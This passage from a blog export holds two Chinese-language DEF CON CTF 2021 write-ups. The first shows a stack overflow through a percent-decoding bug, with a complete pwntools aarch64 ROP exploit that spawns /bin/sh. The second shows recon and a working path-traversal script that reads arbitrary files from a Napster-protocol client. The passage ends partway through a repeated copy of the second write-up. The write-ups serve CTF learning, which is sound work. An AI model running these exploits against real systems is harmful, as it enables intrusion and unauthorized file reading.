class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">__int64 <span class=\"title\">vuln</span><span class=\"params\">(__int64 a1, __int64 a2)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> v3;</span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> v4;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> v7;</span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> i;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> count;</span><br><span class=\"line\"></span><br><span class=\"line\">    count = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; ; ++i )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        v7 = *(_BYTE *)(a2 + count);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( !v7 )</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( v7 == <span class=\"string\">&#x27;%&#x27;</span> )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            v3 = <span class=\"number\">16</span> * hex_to_dec(*(_BYTE *)(a2 + count + <span class=\"number\">1</span>));</span><br><span class=\"line\">            v7 = v3 | hex_to_dec(*(_BYTE *)(a2 + count + <span class=\"number\">2</span>));</span><br><span class=\"line\">            count += <span class=\"number\">3</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            ++count;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        v4 = i;</span><br><span class=\"line\">        *(_BYTE *)(a1 + v4) = v7;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> i;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">__int64 <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    __int64 *v1;</span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> __int8 v2[<span class=\"number\">1024</span>];</span><br><span class=\"line\">    <span class=\"keyword\">char</span> v3[<span class=\"number\">16</span>];</span><br><span class=\"line\">    <span class=\"keyword\">int</span> v4;</span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> __int64 lenStrNum;</span><br><span class=\"line\">    __int64 v6;</span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> __int8 *v7;</span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> __int8 *strNum;</span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> __int8 *v9;</span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> __int8 *v10;</span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> v11;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *v12;</span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> __int8 *v13;</span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> __int8 *token_;</span><br><span class=\"line\"></span><br><span class=\"line\">    sub_401018((__int64)&amp;unk_41D0F0, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">    sub_401018((__int64)&amp;unk_41D000, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">    v13 = <span class=\"string\">&quot;GET /api/isodd/&quot;</span>;</span><br><span class=\"line\">    v12 = <span class=\"string\">&quot;Buy isOddCoin, the hottest new cryptocurrency!&quot;</span>;</span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(v3, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(v3));</span><br><span class=\"line\">    <span class=\"built_in\">memset</span>((<span class=\"keyword\">int8x16_t</span> *)v2, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(v2));</span><br><span class=\"line\">    token_ = <span class=\"string\">&quot;public&quot;</span>;</span><br><span class=\"line\">    v11 = read(<span class=\"number\">0</span>, v2, <span class=\"number\">0x3FF</span>); <span class=\"comment\">// 沒有 null terminate 的問題</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v11 &lt;= <span class=\"number\">8</span> || <span class=\"built_in\">strncmp</span>(v2, v13, <span class=\"number\">15</span>) )</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    v10 = <span class=\"built_in\">strchr</span>(v2, <span class=\"string\">&#x27;\\n&#x27;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v10 )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        *v10-- = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( *v10 == <span class=\"string\">&#x27;\\r&#x27;</span> )</span><br><span class=\"line\">            *v10 = <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    v10 = strtok(v2, <span class=\"string\">&quot; HTTP/&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v10 )</span><br><span class=\"line\">        *v10 = <span class=\"number\">0</span>;</span><br><span class=\"line\">    v9 = <span class=\"built_in\">strchr</span>(v2, <span class=\"string\">&#x27;?&#x27;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v9 )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        *v9++ = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strncmp</span>(v9, <span class=\"string\">&quot;token=&quot;</span>, <span class=\"number\">6</span>) )</span><br><span class=\"line\">            token_ = v9 + <span class=\"number\">6</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    strNum = &amp;v2[<span class=\"number\">15</span>];</span><br><span class=\"line\">    v7 = <span class=\"built_in\">strchr</span>(&amp;v2[<span class=\"number\">15</span>], <span class=\"string\">&#x27;/&#x27;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v7 )</span><br><span class=\"line\">        *v7 = <span class=\"number\">0</span>;</span><br><span class=\"line\">    v6 = <span class=\"number\">0</span>;</span><br><span class=\"line\">    lenStrNum = <span class=\"built_in\">strlen</span>(strNum);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(token_, <span class=\"string\">&quot;enterprise&quot;</span>) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( lenStrNum &gt; <span class=\"number\">0xC</span> )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            response(<span class=\"number\">401</span>, <span class=\"string\">&quot;&#123;\\n\\t\\&quot;error\\&quot;: \\&quot;contact us for unlimited large number support\\&quot;\\n&#125;&quot;</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(token_, <span class=\"string\">&quot;premium&quot;</span>) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( lenStrNum &gt; <span class=\"number\">9</span> )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            response(<span class=\"number\">401</span>, <span class=\"string\">&quot;&#123;\\n\\t\\&quot;error\\&quot;: \\&quot;sign up for enterprise to get large number support\\&quot;\\n&#125;&quot;</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        token_ = <span class=\"string\">&quot;public&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( lenStrNum &gt; <span class=\"number\">6</span> )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            response(<span class=\"number\">401</span>, <span class=\"string\">&quot;&#123;\\n\\t\\&quot;error\\&quot;: \\&quot;sign up for premium or enterprise to get large number support\\&quot;\\n&#125;&quot;</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    lenStrNum = (<span class=\"keyword\">int</span>)vuln((__int64)v3, (__int64)strNum);<span class=\"comment\">// 漏洞函數，v3 也在 stack 上</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v3[<span class=\"number\">0</span>] == <span class=\"string\">&#x27;-&#x27;</span> &amp;&amp; !<span class=\"built_in\">strcmp</span>(token_, <span class=\"string\">&quot;public&quot;</span>) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        response(<span class=\"number\">401</span>, <span class=\"string\">&quot;&#123;\\n\\t\\&quot;error\\&quot;: \\&quot;sign up for premium or enterprise to get negative number support\\&quot;\\n&#125;&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        v4 = (<span class=\"keyword\">unsigned</span> __int8)v3[lenStrNum - <span class=\"number\">1</span>] - <span class=\"string\">&#x27;0&#x27;</span>;</span><br><span class=\"line\">        v1 = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(token_, <span class=\"string\">&quot;public&quot;</span>) )</span><br><span class=\"line\">            asprintf(&amp;v1, <span class=\"string\">&quot;&#123;\\n\\t\\&quot;isodd\\&quot;: %s,\\n\\t\\&quot;ad\\&quot;: \\&quot;%s\\&quot;\\n&#125;\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">            asprintf(&amp;v1, <span class=\"string\">&quot;&#123;\\n\\t\\&quot;isodd\\&quot;: %s\\n&#125;\\n&quot;</span>);</span><br><span class=\"line\">        response(<span class=\"number\">200</span>, v1);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>仔細分析完上面的程式碼可以知道這整份 code 大部分的工作都在進行 http request 的 parsing，而這份程式接受的 http request 格式大約如下，其中 <code>[strNum]</code> 以及 <code>[token]</code> 替換成上面 c code 中對應的變數。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /api/isodd/[strNum]/?token=[token] HTTP/</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"漏洞函數\"><a href=\"#漏洞函數\" class=\"headerlink\" title=\"漏洞函數\"></a>漏洞函數</h2><p>漏洞函數在上面 c code 中的 <code>vuln</code> 中，但是在進入 <code>vuln</code> 之前，中間會驗證 <code>lenStrNum</code> ，而長度最大只能為 0xc。如此一來便很難造成 overflow。( v3 在 stack 上 )</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lenStrNum = <span class=\"built_in\">strlen</span>(strNum);</span><br><span class=\"line\">...</span><br><span class=\"line\">lenStrNum = (<span class=\"keyword\">int</span>)vuln((__int64)v3, (__int64)strNum);</span><br></pre></td></tr></table></figure>\n\n<p>接下來看到 <code>vuln</code> 內部，可以看到這個函數主要負責進行類似 <code>strcpy</code> 的行為，一樣也是以 <code>\\x00</code> 為中止點，且多了一個功能。當目前正在 copy 的字元為 <code>%</code> 時，會將後面的兩個字元視為 hex string 轉成一個 byte 並存起來。例如 <code>&quot;%0a&quot;</code>會被轉成 <code>&#39;\\n&#39;</code> ，並當成一個 byte 存取來。我們也可以利用這樣的特性來製作使得 <code>x00</code> 被跳過。<strong>例如 <code>&quot;%\\x001aaaaaaaaaa&quot;</code> 這個字串的雖然有  null terminator，但在這裡由於前面有 <code>%</code> 的緣故，會直接跳過，而且對於 <code>strlen</code> 來說這個字串長度只有 1 ，但實際上有 13 bytes，一來便可以順便繞過對於 <code>strNum</code> 的長度限制。</strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">...</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( v7 == <span class=\"string\">&#x27;%&#x27;</span> )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    v3 = <span class=\"number\">16</span> * hex_to_dec(*(_BYTE *)(a2 + count + <span class=\"number\">1</span>));</span><br><span class=\"line\">    v7 = v3 | hex_to_dec(*(_BYTE *)(a2 + count + <span class=\"number\">2</span>));</span><br><span class=\"line\">    count += <span class=\"number\">3</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n\n<p>利用上面提到的方法，我們便可以進行 buffer overflow，但這裡有個有趣的現象，可以看出來這份程式有被特殊處理過。</p>\n<p>以下分別為 main 的 prologue 跟 epilogue，其中可以看到在進行創造 stack frame 的時候，居然不是以高地址為 stack bottom ，然後往低地址增長，而是以低地址為 stack bottom ，然後往高地址增長。</p>\n<p>其中很明顯地看到人為的處理。例如說:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sub sp, sp, #0x490</span><br><span class=\"line\">被換成</span><br><span class=\"line\">add sp, sp, #0x490</span><br><span class=\"line\">sub sp, sp, #0x490</span><br><span class=\"line\"></span><br><span class=\"line\">然後</span><br><span class=\"line\">stp x29, x30, [sp,#0]</span><br><span class=\"line\">被換成</span><br><span class=\"line\">stp x29, x30, [sp,#0]</span><br><span class=\"line\">add sp, sp, #0x490</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"/2022/01/22/defcon-ctf-2021-quals-mra/Z8LVbx5.png\"></p>\n<p><img src=\"/2022/01/22/defcon-ctf-2021-quals-mra/3QdQD5F.png\"></p>\n<p>那麼這樣我們的 buffer overflow 的構造 ROP 的方式就會跟以往不太一樣。以下為 layout。</p>\n<p><img src=\"/2022/01/22/defcon-ctf-2021-quals-mra/T0myzaL.png\"></p>\n<p>我們的目標就是覆蓋到 vuln’s stack frame 上的 <code>x30</code> 藉此控制到 return 後的流程。</p>\n<p><img src=\"/2022/01/22/defcon-ctf-2021-quals-mra/1v2Ebom.png\" alt=\"img\"></p>\n<h2 id=\"尋找-gadget\"><a href=\"#尋找-gadget\" class=\"headerlink\" title=\"尋找 gadget\"></a>尋找 gadget</h2><p>利用 IDA 的 <strong>find text</strong> 搭配 regular express 搜尋 <code>svc *0</code> 便可以搜尋到很多執行 system call 的 gadget，</p>\n<p>而這裡我挑的是這段:</p>\n<p><img src=\"/2022/01/22/defcon-ctf-2021-quals-mra/iSM4UfH.png\"></p>\n<h2 id=\"exploit\"><a href=\"#exploit\" class=\"headerlink\" title=\"exploit\"></a>exploit</h2><p>將上面得到的資訊整理再一起，我們可以得到以下 exploit:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.clear()</span><br><span class=\"line\">context.update(arch=<span class=\"string\">&quot;aarch64&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">local = <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">encode</span>(<span class=\"params\">s</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> s.replace(<span class=\"string\">b&#x27;\\x00&#x27;</span>, <span class=\"string\">b&#x27;%\\x00\\x00&#x27;</span>)</span><br><span class=\"line\">p = <span class=\"literal\">None</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> local:</span><br><span class=\"line\">    p = gdb.debug(<span class=\"string\">&quot;./mra&quot;</span>, gdbscript = <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">        b *0x400338</span></span><br><span class=\"line\"><span class=\"string\">        b *0x4005d4</span></span><br><span class=\"line\"><span class=\"string\">        b *0x4002C0</span></span><br><span class=\"line\"><span class=\"string\">    &#x27;&#x27;&#x27;</span></span><br><span class=\"line\">    )</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    p = remote(<span class=\"string\">&quot;172.17.0.2&quot;</span>, <span class=\"number\">8000</span>)</span><br><span class=\"line\">rop_chain = flat([</span><br><span class=\"line\">    <span class=\"comment\"># execve(0x41d000, 0, 0)</span></span><br><span class=\"line\">    <span class=\"number\">0</span>, <span class=\"comment\"># x4</span></span><br><span class=\"line\">    <span class=\"number\">0</span>, <span class=\"comment\"># x3</span></span><br><span class=\"line\">    <span class=\"number\">0</span>, <span class=\"comment\"># x2</span></span><br><span class=\"line\">    <span class=\"number\">0</span>, <span class=\"comment\"># x1</span></span><br><span class=\"line\">    <span class=\"number\">0x41D000</span>,   <span class=\"comment\"># x0</span></span><br><span class=\"line\">    <span class=\"number\">221</span>, <span class=\"comment\"># x8</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># read(0, 0x41d000,64)</span></span><br><span class=\"line\">    <span class=\"number\">0</span>,   <span class=\"comment\"># x4</span></span><br><span class=\"line\">    <span class=\"number\">0</span>,   <span class=\"comment\"># x3</span></span><br><span class=\"line\">    <span class=\"number\">0x10</span>, <span class=\"comment\"># x2</span></span><br><span class=\"line\">    <span class=\"number\">0x41D000</span>, <span class=\"comment\"># x1</span></span><br><span class=\"line\">    <span class=\"number\">0</span>,   <span class=\"comment\"># x0</span></span><br><span class=\"line\">    <span class=\"number\">63</span>, <span class=\"comment\"># x8</span></span><br><span class=\"line\"></span><br><span class=\"line\">])</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">.text:00000000004007EC                 LDUR            X8, [SP,#-0x30+arg_28]</span></span><br><span class=\"line\"><span class=\"string\">.text:00000000004007F0                 LDUR            X0, [SP,#-0x30+arg_20]</span></span><br><span class=\"line\"><span class=\"string\">.text:00000000004007F4                 LDUR            X1, [SP,#-0x30+arg_18]</span></span><br><span class=\"line\"><span class=\"string\">.text:00000000004007F8                 LDUR            X2, [SP,#-0x30+arg_10]</span></span><br><span class=\"line\"><span class=\"string\">.text:00000000004007FC                 LDUR            X3, [SP,#-0x30+arg_8]</span></span><br><span class=\"line\"><span class=\"string\">.text:0000000000400800                 LDUR            X4, [SP,#-0x30+arg_0]</span></span><br><span class=\"line\"><span class=\"string\">.text:0000000000400804                 SVC             0</span></span><br><span class=\"line\"><span class=\"string\">.text:0000000000400808                 SUB             SP, SP, #0x30 ; &#x27;0&#x27;</span></span><br><span class=\"line\"><span class=\"string\">.text:000000000040080C                 RET</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">trigger = flat([</span><br><span class=\"line\">    <span class=\"number\">0</span>, <span class=\"comment\"># x29</span></span><br><span class=\"line\">    <span class=\"comment\">#</span></span><br><span class=\"line\">    <span class=\"number\">0x4007EC</span></span><br><span class=\"line\">])</span><br><span class=\"line\"></span><br><span class=\"line\">p.send((<span class=\"string\">b&quot;GET /api/isodd/%\\x001&quot;</span> + encode(<span class=\"string\">b&quot;a&quot;</span> * (<span class=\"number\">0x68</span> - <span class=\"built_in\">len</span>(rop_chain)  - <span class=\"number\">1</span>) + rop_chain + trigger)).ljust(<span class=\"number\">0x3ff</span>, <span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(<span class=\"string\">b&quot;/bin/sh\\x00&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"Resource\"><a href=\"#Resource\" class=\"headerlink\" title=\"Resource\"></a>Resource</h1><p><a href=\"https://github.com/torvalds/linux/blob/v4.17/include/uapi/asm-generic/unistd.h\">Arm syscall number table</a></p>\n<p><a href=\"https://modexp.wordpress.com/2018/10/30/arm64-assembly/\">A Guide to ARM64 / AArch64 Assembly on Linux with Shecodes and Cryptography</a></p>\n"},{"title":"defcon ctf 2021 quals - nooopster","date":"2022-01-22T21:31:09.000Z","_content":"\n# nooopster\n\n![](BT4KL7X.png)\n\n![](Z1zFFtl.png)\n\n![](8tJ74WV.png)\n\n## 偵蒐階段\n\n進入內網後對 **192.168.5.1** 進行掃描。得到以下結果\n\n```\nStarting Nmap 7.80 ( https://nmap.org ) at 2022-01-23 06:08 CST\nNmap scan report for 192.168.5.1\nHost is up (0.011s latency).\n\nPORT     STATE SERVICE         VERSION\n7070/tcp open  napster         MLDonkey multi-network P2P client\n8888/tcp open  sun-answerbook?\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 60.47 seconds\n\n```\n\n跟這兩個 port 進行互動沒得到什麼資訊，拿 **napster** 這個字眼跟題目很像的名字進行搜尋，發現這個 [client](http://nap.sourceforge.net/) ，載下來後跟 port 7070 互動，但發現沒有效果，嘗試用一樣的程式跟 port 8888 互動得到了響應。[Linux Napster Client: User Guide](http://nap.sourceforge.net/userguide.html) 這裡提供跟 napster server 互動的所有指令。\n\n![](62rKHoR.png)\n\n以下我執行了這些指令。\n\n```bash\n# 列出所有頻道\n/clist\n\n# 進入 chat 頻道\n/join #chat\n\n# 列出 nooopster 這個用戶提供的檔案清單\n/browse nooopster\n```\n\n清單中有一個非 mp3 的檔案，載下來之後發現這是一隻 elf 格式的程式。我們開始嘗試逆它。\n\n![](Jbt611q.png)\n\n## 逆向\n\n分析整體流程可以大約分為以下幾個階段: \n\n1. 連線到 127.0.0.1:8888 ， 並且檢查 napser server 上有沒有 **nooopster** 這個用戶，若沒有的話，以 **nooopster** 為用戶名登入。\n2. 創建一條 thread 並且在裡面創建 data server (負責用來上傳檔案到 nooopster server 或是讓其他用戶直接下載檔案) 在 0.0.0.0:7070 監聽。\n   1. 收到用戶連線後，創建一條 thread 負責處理此用戶的請求，先檢查用戶是否在下載請求的清單中，如果在的話，接者檢查要求的檔案名稱是否以字串 **\"\\shared\\\\\"** 作為開頭，若通過檢查，接者會把字串 **\"\\shared\\\\\"** 以後檔案名稱作為字串傳入 `open` 中。例如用戶要求下載 **\"\\shared\\\\/etc/passwd\"**，則最後得到的結果會是 `open(\"/etc/passwd\",\"r\")`。 這裡很明顯有**路徑穿越的漏洞**，可以利用這個漏洞去讀 **\"/flag\"**。\n3. main thread 接者會不斷的重複傳送幾條提示用的訊息到 napster server 中的頻道 chat 中，以及接收來自 napster server 的檔案下載請求 ( 其他用戶的下載請求 )，這裡不做任何檢查，**直接把用戶名加入下載請求的清單中**。\n\n\n\n分析完後可以很明顯的發現，這是一隻根據 napster 的 protocol 實作出來的簡易 client，且帶有**路徑穿越的漏洞**，讓我們能夠下載任意檔案。\n\n## 利用腳本\n\n詳細的 protocol 細節在逆向 nooopster 這支 binary 的時候，有搜尋到對應的 [specification](http://opennap.sourceforge.net/napster.txt)，照著上面內容實作跟 server 互動的封包即可。\n\n```python\nfrom pwn import *\nimport ipaddress\n\nuser = \"test\"\ndef to_nap_format(opcode, content):\n    return p16(len(content)) + p16(opcode) + content\n\ndef nap_msg_send(s, opcode, content):\n    s.send(to_nap_format(opcode, content))\n\ndef nap_msg_recv(s):\n    tmp = s.recvn(4, timeout = 0.5)\n    if not tmp:\n        return None  \n    n = u16(tmp[:2])\n    opcode = u16(tmp[2:])\n    \n    return {\"op\": opcode, \"data\":s.recvn(n)}\n\nnap_server = remote(\"192.168.5.1\", 8888)\n\n# 檢查 napster server 上是否有這個用戶名\nnap_msg_send(nap_server, 7, user.encode())\nmsg = nap_msg_recv(nap_server)\nprint(msg)\n\n# 登入伺服器\nnap_msg_send(nap_server, 2, f\"{user} test 0 \\\"nap v0.8\\\" 3\".encode())\nmsg = nap_msg_recv(nap_server)\nprint(msg)\n\n# 接收一些伺服器資訊\nwhile 1:\n    msg = nap_msg_recv(nap_server)\n    if not msg:\n        break\n\n# 請 napster server 向 nooopster 請求我們下載檔案的請求\nnap_msg_send(nap_server, 203, b\"nooopster \\\"\\\\shared\\\\nooopster\\\"\") \nmsg = nap_msg_recv(nap_server)\nprint(msg)\ntmp = msg[\"data\"].split(b' ')\n\n# nooopster 接受下載後 napster server 會回覆我們 nooopster's 的 data server 的地址和端口\nip = str(ipaddress.IPv4Address(u32(p32(int(tmp[1])), endian = \"big\")))\nport = int(tmp[2])\n\n# 直接觸發路徑穿越漏洞去讀取 flag\ndata_server = remote(ip, port)\nprint(data_server.recv())\ntarget_file = \"/flag\"\ndata_server.send(f\"GET{user} \\\"\\\\shared\\\\{target_file}\\\" 0\".encode())\n\nprint(data_server.recvall().decode())\nnap_server.close()\ndata_server.close()\n```\n\n\n\n# resource \n\n[Linux Napster Client: User Guide](http://nap.sourceforge.net/userguide.html#4.2.)\n\n[napster protocol](http://opennap.sourceforge.net/napster.txt)\n","source":"_posts/defcon-ctf-2021-quals-nooopster.md","raw":"---\ntitle: defcon ctf 2021 quals - nooopster\ndate: 2022-01-23 05:31:09\ntags:\n- defcon ctf 2021 quals\n- pwn\ncategories:\n- CTF \n---\n\n# nooopster\n\n![](BT4KL7X.png)\n\n![](Z1zFFtl.png)\n\n![](8tJ74WV.png)\n\n## 偵蒐階段\n\n進入內網後對 **192.168.5.1** 進行掃描。得到以下結果\n\n```\nStarting Nmap 7.80 ( https://nmap.org ) at 2022-01-23 06:08 CST\nNmap scan report for 192.168.5.1\nHost is up (0.011s latency).\n\nPORT     STATE SERVICE         VERSION\n7070/tcp open  napster         MLDonkey multi-network P2P client\n8888/tcp open  sun-answerbook?\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 60.47 seconds\n\n```\n\n跟這兩個 port 進行互動沒得到什麼資訊，拿 **napster** 這個字眼跟題目很像的名字進行搜尋，發現這個 [client](http://nap.sourceforge.net/) ，載下來後跟 port 7070 互動，但發現沒有效果，嘗試用一樣的程式跟 port 8888 互動得到了響應。[Linux Napster Client: User Guide](http://nap.sourceforge.net/userguide.html) 這裡提供跟 napster server 